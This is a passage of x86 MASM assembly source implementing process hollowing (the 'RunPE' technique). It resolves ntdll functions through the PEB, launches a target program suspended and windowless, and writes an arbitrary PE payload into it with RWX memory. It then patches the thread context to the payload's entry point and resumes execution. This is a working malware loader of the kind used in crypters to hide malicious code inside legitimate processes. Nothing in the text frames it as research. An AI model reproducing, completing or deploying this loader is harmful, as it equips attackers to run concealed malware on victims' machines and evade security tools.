getPE PROTO payload:DWORD

.CODE
GetNtdllHandle PROC
    ASSUME FS:NOTHING
    mov     eax, fs:[30h]      
    mov     eax, [eax + 0Ch]   
    mov     eax, [eax + 14h]   
    mov     eax, [eax]         
    mov     eax, [eax + 10h]  
    mov     hNtdll, eax
    ret
GetNtdllHandle ENDP
InitNtFunctions PROC
    invoke GetNtdllHandle
    
 
    invoke GetProcAddress, hNtdll, addr szNtAllocateVirtualMemory
    mov NtAllocateVirtualMemory_f, eax


    invoke GetProcAddress, hNtdll, addr szNtWriteVirtualMemory
    mov NtWriteVirtualMemory_f, eax
    

    invoke GetProcAddress, hNtdll, addr szNtResumeThread
    mov NtResumeThread_f, eax
    
    invoke GetProcAddress, hNtdll, addr szNtGetContextThread
    mov NtGetContextThread_f, eax
    
    invoke GetProcAddress, hNtdll, addr szNtSetContextThread
    mov NtSetContextThread_f, eax
    
    invoke GetProcAddress, hNtdll, addr szNtReadVirtualMemory
    mov NtReadVirtualMemory_f, eax
    
   invoke GetProcAddress, hNtdll, addr szNtTerminateProcess
    mov NtTerminateProcess_f, eax
    
    ret
InitNtFunctions ENDP


getPE PROC uses eax ebx esi edi payload:DWORD
    LOCAL fileAddress:DWORD
    LOCAL imageBase:DWORD
    LOCAL newImageBase:DWORD
    LOCAL sectionOffset:DWORD
    LOCAL virtualAddress:DWORD
    LOCAL sizeOfRawData:DWORD
    LOCAL pointerToRawData:DWORD
    LOCAL numberOfSections:WORD
    LOCAL pointerToRawCalc:DWORD
    LOCAL sizeOfImage:DWORD
    LOCAL EntryPoint:DWORD
    LOCAL sizeOfHeaders:DWORD
    LOCAL rvaAddress:DWORD
    LOCAL context:CONTEXT
    LOCAL start_info:STARTUPINFO
    LOCAL process_info:PROCESS_INFORMATION
    LOCAL BytesWritten:DWORD
    LOCAL BytesRead:WORD
        LOCAL currentPath[MAX_PATH]:BYTE
    mov ebx, payload 
    
    .if hNtdll == 0
        invoke InitNtFunctions
    .endif

    ; Parse PE Headers
    mov eax, [ebx + 3Ch]              
    mov fileAddress, eax
    
    mov eax, fileAddress
    add eax, ebx
    add eax, 6                        
    movzx eax, word ptr [eax]
    mov numberOfSections, ax
    
    mov eax, fileAddress
    add eax, ebx
    mov eax, [eax + 28h]              
    mov EntryPoint, eax
    
    mov eax, fileAddress
    add eax, ebx
    mov eax, [eax + 34h]              
    mov imageBase, eax
    
    mov eax, fileAddress
    add eax, ebx
    mov eax, [eax + 50h]              
    mov sizeOfImage, eax
    
    mov eax, fileAddress
    add eax, ebx
    mov eax, [eax + 54h]              
    mov sizeOfHeaders, eax
    
    mov eax, fileAddress
    add eax, 0F8h                     
    mov sectionOffset, eax 

    ; Create Process
    invoke RtlZeroMemory, addr start_info, sizeof start_info
    invoke RtlZeroMemory, addr process_info, sizeof process_info
    invoke CreateProcess, addr target, NULL, NULL, NULL, FALSE, \
           CREATE_SUSPENDED or CREATE_NO_WINDOW, NULL, NULL, \
           addr start_info, addr process_info
    test eax, eax
    jz process_exit
    
    ; Get Thread Context
    mov context.ContextFlags, CONTEXT_FULL
    lea eax, context
    push eax
    push process_info.hThread
    call NtGetContextThread_f
    
    
    ; Allocate Memory
    push PAGE_RWX
    push MEM_COMMIT + MEM_RESERVE
    lea eax, sizeOfImage
    push eax
    push 0
    lea eax, imageBase
    push eax  
    push process_info.hProcess
    call NtAllocateVirtualMemory_f

    ; Write Headers
    lea eax, BytesWritten   
    push eax
    push sizeOfHeaders                 
    push payload              
    push imageBase           
    push process_info.hProcess
    call NtWriteVirtualMemory_f
    
    ; Process Sections
    xor si, si
    .repeat 
        mov ebx, payload
        mov eax, sectionOffset
        add eax, ebx
        
        push eax
        mov eax, [eax + 0Ch]          
        mov rvaAddress, eax
        pop eax
        
        push eax
        mov eax, [eax + 10h]          
        mov sizeOfRawData, eax
        pop eax
        
        mov eax, [eax + 14h]          
        mov pointerToRawData, eax
        
        mov eax, pointerToRawData
        add eax, ebx
        mov pointerToRawCalc, eax
        
        mov ecx, imageBase
        add ecx, rvaAddress
        mov virtualAddress, ecx
        
        ; Write Section
        lea eax, BytesWritten    
        push eax
        push sizeOfRawData                  
        push pointerToRawCalc              
        push ecx            
        push process_info.hProcess
        call NtWriteVirtualMemory_f
       
        inc si
        add sectionOffset, 28h         
    .until si == numberOfSections
    
    ; Update Process Context
    mov edi, context.regEbx
    add edi, 8
    lea eax, BytesWritten 
    push eax
    push 4                  
    lea eax, imageBase             
    push eax
    push edi            
    push process_info.hProcess
    call NtWriteVirtualMemory_f
    
    mov ebx, imageBase
    add ebx, EntryPoint
    mov context.regEax, ebx
    
    lea eax, context
    push eax
    push process_info.hThread
    call NtSetContextThread_f
    
	push NULL                
	lea eax, BytesWritten
	push eax
	push 2                  
	lea eax, BytesRead      
	push eax
	push imageBase          
	push process_info.hProcess
	call NtReadVirtualMemory_f

	cmp word ptr [BytesRead], 'ZM'
	jnz terminate

	; Resume if MZ found
	push NULL
	push process_info.hThread  
	call NtResumeThread_f
	jmp process_exit

	terminate:
	push 1    
	push process_info.hProcess
	call NtTerminateProcess_f

process_exit:
ret
getPE endp